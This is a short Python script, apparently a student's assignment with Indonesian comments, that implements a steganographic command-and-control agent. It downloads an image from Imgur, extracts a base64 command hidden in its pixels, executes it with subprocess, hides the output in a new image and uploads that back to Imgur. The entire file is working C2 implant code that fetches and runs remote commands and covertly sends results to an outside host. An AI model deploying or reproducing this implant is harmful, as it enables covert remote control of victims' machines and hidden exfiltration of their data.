# Fabian Ferristo Tirtabudi - 2301864581 #

import base64
import pyimgur
import stegano
import subprocess
import urllib.request

IMGUR_LINK = "" # masukkan link imgur berisi command
IMAGE_TO_DOWNLOAD = "image_with_command.png"
IMAGE_TO_UPLOAD = "image_with_result.png"
IMGUR_CLIENT_ID = "" # masukkan client_id

urllib.request.urlretrieve(IMGUR_LINK, IMAGE_TO_DOWNLOAD)
encoded_command = stegano.lsb.reveal(IMAGE_TO_DOWNLOAD)
decoded_command = base64.b64decode(encoded_command.encode()).decode()

print("\n-----------------------------------------------------------------")
print("Command found from image: " + decoded_command)
print("-----------------------------------------------------------------")

result = str(subprocess.check_output(decoded_command).decode('utf-8').strip())
encoded_result = base64.b64encode((decoded_command + ": " + result + "\r\n").encode()).decode()

image_with_command = stegano.lsb.hide(IMAGE_TO_DOWNLOAD, encoded_result)
image_with_command.save(IMAGE_TO_UPLOAD)
print("Encoded result injected to '" + IMAGE_TO_UPLOAD + "': " + stegano.lsb.reveal(IMAGE_TO_UPLOAD))
print("-----------------------------------------------------------------")

upload = pyimgur.Imgur(IMGUR_CLIENT_ID)
uploaded = upload.upload_image(IMAGE_TO_UPLOAD, title = "stegano sebagai c&c")
print("Imgur link: " + uploaded.link)
print("Delete hash: " + uploaded.deletehash)
print("-----------------------------------------------------------------\n")
